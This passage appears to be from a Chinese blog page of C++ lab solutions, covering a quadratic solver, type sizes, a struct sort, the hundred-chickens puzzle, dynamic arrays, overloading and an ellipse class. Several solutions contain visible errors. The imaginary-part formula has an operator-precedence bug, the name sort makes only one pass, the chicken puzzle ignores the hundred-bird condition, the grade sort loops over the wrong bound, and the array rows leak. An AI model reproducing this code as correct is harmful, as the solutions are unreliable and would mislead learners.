&lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;x1等于：&quot;</span> &lt;&lt; x1 &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;x2等于：&quot;</span> &lt;&lt; x2 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (d == <span class="number">0</span>) &#123;</span><br><span class="line">x1 = x2 = (-b + <span class="built_in">sqrt</span>(d)) / (<span class="number">2</span> * a);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;此时两个根相同&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;x1=x2=&quot;</span> &lt;&lt; x1 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">realPart = -b / (<span class="number">2</span> * a);</span><br><span class="line">maginaryPart = <span class="built_in">sqrt</span>(-d) / <span class="number">2</span> * a;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;此时两个不同的根&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;x1等于：&quot;</span> &lt;&lt; realPart &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; maginaryPart&lt;&lt; <span class="string">&quot;i&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;x2等于：&quot;</span> &lt;&lt; realPart &lt;&lt; <span class="string">&quot;-&quot;</span> &lt;&lt; maginaryPart&lt;&lt; <span class="string">&quot;i&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验二">实验二</h2><h3 id="1-编写一个程序，输出基本数据类型-char-short-int-long-float-double-bool-和指针类型-void-char-short-int-long-float-double-的数据类型的长度。">1. 编写一个程序，输出基本数据类型 char, short, int, long, float, double, bool 和指针类型 void*, char*, short*, int*, long*, float*, double*的数据类型的长度。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;char数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">char</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;short数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">short</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;int数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">int</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;long数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">long</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;float数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">float</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;double数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">double</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;bool数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">bool</span>) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;void*数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">void</span>*) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;char*数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">char</span>*) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;short*数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">short</span>*) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;int*数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">int</span>*) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;long*数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">long</span>*) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;float*数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">float</span>*) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;double*数据类型的大小为：&quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(<span class="type">double</span>*) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-编写一个程序，程序中包含学生结构体用来存储学生信息（学号，姓名，年龄，专业），定义数组，输入-5-个学生的信息，并按学生姓名在字母表中的顺序排序，然后输出。要求程序中用到-typedef-关键字。">2. 编写一个程序，程序中包含学生结构体用来存储学生信息（学号，姓名，年龄，专业），定义数组，输入 5 个学生的信息，并按学生姓名在字母表中的顺序排序，然后输出。要求程序中用到 typedef 关键字。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;       <span class="comment">//学号</span></span><br><span class="line"><span class="type">char</span> name[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;   <span class="comment">//姓名</span></span><br><span class="line"><span class="type">int</span> age = <span class="number">0</span>;       <span class="comment">//年龄</span></span><br><span class="line">string zhuanye;<span class="comment">//专业</span></span><br><span class="line">&#125;S;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ScanData</span><span class="params">(S* a, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入学生的学号、姓名、年龄、专业：&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123; cin &gt;&gt; a[i].num &gt;&gt; a[i].name &gt;&gt; a[i].age &gt;&gt; a[i].zhuanye; &#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;数据输入成功&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>); <span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintData</span><span class="params">(S* a, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;学号\t姓名\t年龄\t专业&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123; cout &lt;&lt; a[i].num &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; a[i].name &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; a[i].age &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; a[i].zhuanye &lt;&lt; endl; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DataSort</span><span class="params">(S* a, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="type">int</span> p = <span class="built_in">strcmp</span>(a[i].name, a[i + <span class="number">1</span>].name);</span><br><span class="line"><span class="keyword">if</span> (p &gt; <span class="number">0</span>) &#123;</span><br><span class="line">S temp = a[i];    a[i] = a[i + <span class="number">1</span>];   a[i + <span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">S a[<span class="number">5</span>];    <span class="built_in">ScanData</span>(a, <span class="number">5</span>);  <span class="built_in">DataSort</span>(a, <span class="number">5</span>);   <span class="built_in">PrintData</span>(a, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="built_in">test01</span>(); &#125;</span><br></pre></td></tr></table></figure><h3 id="3-百钱买百鸡问题">3. 百钱买百鸡问题</h3><p>公元 5 世纪末，中国古代数学家张丘建在《算经》中提出了如下问题：鸡翁一值钱五，鸡母一值钱三，鸡雏三值钱一。凡百钱买百鸡，问鸡翁、母、雏各几何？要求，输入任何一个正整数代表钱数，然后输出这些钱能买的鸡的组合情况。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">20</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;j&lt;<span class="number">33</span>; j++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>;k&lt;<span class="number">100</span>; k++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((i * <span class="number">5</span> + j * <span class="number">3</span> + k) == <span class="number">100</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;公鸡&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;只  母鸡&quot;</span> &lt;&lt; j &lt;&lt; <span class="string">&quot;只  雏鸡&quot;</span> &lt;&lt; k * <span class="number">3</span> &lt;&lt; <span class="string">&quot;只&quot;</span> &lt;&lt; endl;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验三">实验三</h2><h3 id="1-编写-vmalloc-和-vfree-函数，使用-new-和-delete，使得这两个函数分别能够分配和释放任意行数和列数的动态整型二维数组，vmalloc-和-vfree-函数的原型如下：">1. 编写 vmalloc 和 vfree 函数，使用 new 和 delete，使得这两个函数分别能够分配和释放任意行数和列数的动态整型二维数组，vmalloc 和 vfree 函数的原型如下：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入行数和列数&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="type">int</span> A, B;</span><br><span class="line"></span><br><span class="line">cin &gt;&gt; A &gt;&gt; B;</span><br><span class="line"><span class="type">int</span>** a;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;开始分配空间&quot;</span> &lt;&lt; endl;</span><br><span class="line">a = <span class="keyword">new</span> <span class="type">int</span>* [A];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A; i++)</span><br><span class="line">a[i] = <span class="keyword">new</span> <span class="type">int</span>[B];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A; i++)</span><br><span class="line"><span class="keyword">delete</span>[] a[i];</span><br><span class="line"><span class="keyword">delete</span>[]a;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;清除空间结束&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-编写程序，处理学生的成绩信息，学生数和科目数未定，留在程序运行时动态指定，计算每个学生的平均成绩，并按照平均成绩从大到小进行排序。">2. 编写程序，处理学生的成绩信息，学生数和科目数未定，留在程序运行时动态指定，计算每个学生的平均成绩，并按照平均成绩从大到小进行排序。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span>** p, <span class="type">int</span> n, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123; cout &lt;&lt; p[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>; &#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;-------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span>* p, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123; cout &lt;&lt; p[i] &lt;&lt; <span class="string">&quot; &quot;</span>; &#125;cout &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;-------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">srand</span>((<span class="type">int</span>)<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;  <span class="type">int</span> m = <span class="number">0</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入班级人数：&quot;</span>;   cin &gt;&gt; n;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入学生的科目数：&quot;</span>;   cin &gt;&gt; m;</span><br><span class="line"><span class="type">int</span>* sum = <span class="keyword">new</span> <span class="type">int</span>[n];</span><br><span class="line"><span class="type">int</span>** array = <span class="keyword">new</span> <span class="type">int</span>* [n];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123; array[i] = <span class="keyword">new</span> <span class="type">int</span>[m]; &#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123; array[i][j] = (<span class="type">int</span>)(<span class="built_in">rand</span>() % <span class="number">20</span> + <span class="number">80</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(array, n, m);</span><br><span class="line"><span class="type">int</span> summ;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">summ = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">summ += array[i][j];</span><br><span class="line">&#125;</span><br><span class="line">sum[i] = summ / m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sum[j] &lt; sum[j + <span class="number">1</span>]) &#123;</span><br><span class="line"><span class="type">int</span> t = sum[j];    sum[j] = sum[j + <span class="number">1</span>];     sum[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(sum, n); <span class="keyword">delete</span>[] sum; <span class="keyword">delete</span>[] array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-通过函数重载，编写一个程序，使得程序能够求出-int，double-型数组中最大数和最小数的差值。">3. 通过函数重载，编写一个程序，使得程序能够求出 int，double 型数组中最大数和最小数的差值。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">findCha</span><span class="params">(<span class="type">int</span>* p, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (p[j] &lt; p[j + <span class="number">1</span>]) &#123; <span class="type">int</span> t = p[j]; p[j] = p[j + <span class="number">1</span>]; p[j + <span class="number">1</span>] = t; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;最大的数与最小的数差值为&quot;</span> &lt;&lt; p[<span class="number">0</span>] - p[n - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">findCha</span><span class="params">(<span class="type">double</span>* p, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (p[j] &lt; p[j + <span class="number">1</span>]) &#123; <span class="type">double</span> t = p[j]; p[j] = p[j + <span class="number">1</span>]; p[j + <span class="number">1</span>] = t; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;最大的数与最小的数差值为&quot;</span> &lt;&lt; p[<span class="number">0</span>] - p[n - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123; a[i] = i; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span>* b = <span class="keyword">new</span> <span class="type">double</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123; cin &gt;&gt; b[i]; &#125;</span><br><span class="line"><span class="built_in">findCha</span>(a, <span class="number">10</span>); <span class="built_in">findCha</span>(b, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-编写一个程序，在程序中-main-函数向-function-函数传递了一个字符串参数，function-函数返回字符串中字符’a’的个数，并且不允许-function-函数修改字符串参数。">4. 编写一个程序，在程序中 main 函数向 function 函数传递了一个字符串参数，function 函数返回字符串中字符’a’的个数，并且不允许 function 函数修改字符串参数。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun</span><span class="params">(string str)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">length</span>(); i++) &#123; <span class="keyword">if</span> (str[i] == <span class="string">&#x27;a&#x27;</span>) &#123; n++; &#125; &#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">string str = <span class="string">&quot;abxsaaphxznxcoiaa&quot;</span>;</span><br><span class="line"><span class="type">int</span> n = <span class="built_in">fun</span>(str);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;该字符串含有的‘a’的个数为：&quot;</span> &lt;&lt; n &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验四">实验四</h2><h3 id="1-定义一个具有各种构造函数的椭圆类（ellipse），并向外输出面积-area；">1. 定义一个具有各种构造函数的椭圆类（ellipse），并向外输出面积 area；</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CEllipse</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">CEllipse</span>(); <span class="built_in">CEllipse</span>(<span class="type">float</span> aLongAxis, <span class="type">float</span> aShortAxis);</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">GetArea</span><span class="params">()</span></span>; <span class="function"><span class="type">float</span> <span class="title">GetCircumference</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">const</span> <span class="type">static</span> <span class="type">float</span> PI;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">float</span> fLongAxis; <span class="type">float</span> fShortAxis;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">CEllipse <span class="title">ellipse</span><span class="params">(<span class="number">7</span>, <span class="number">5</span>)</span></span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Area is &quot;</span> &lt;&lt; ellipse.<span class="built_in">GetArea</span>() &lt;&lt; <span class="string">&quot; and Circumference is &quot;</span> &lt;&lt; ellipse.<span class="built_in">GetCircumference</span>() &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">CEllipse::<span class="built_in">CEllipse</span>() :<span class="built_in">fLongAxis</span>(<span class="number">0.0</span>), <span class="built_in">fShortAxis</span>(<span class="number">0.0</span>) &#123;&#125;</span><br><span class="line">CEllipse::<span class="built_in">CEllipse</span>(<span class="type">float</span> aLongAxis, <span class="type">float</span> aShortAxis) &#123;</span><br><span class="line">fLongAxis = aLongAxis;</span><br><span class="line">fShortAxis = aShortAxis;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">float</span> CEllipse::PI = <span class="number">3.1415926</span>;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">CEllipse::GetArea</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> fLongAxis * fShortAxis * PI; &#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">CEllipse::GetCircumference</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span> * PI * fShortAxis + <span class="number">4</span> * (fLongAxis - fShortAxis); &#125;</span><br></pre></td></tr></table></figure><h3 id="2-定义一个具有构造函数的学生类；">2. 定义一个具有构造函数的学生类；</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 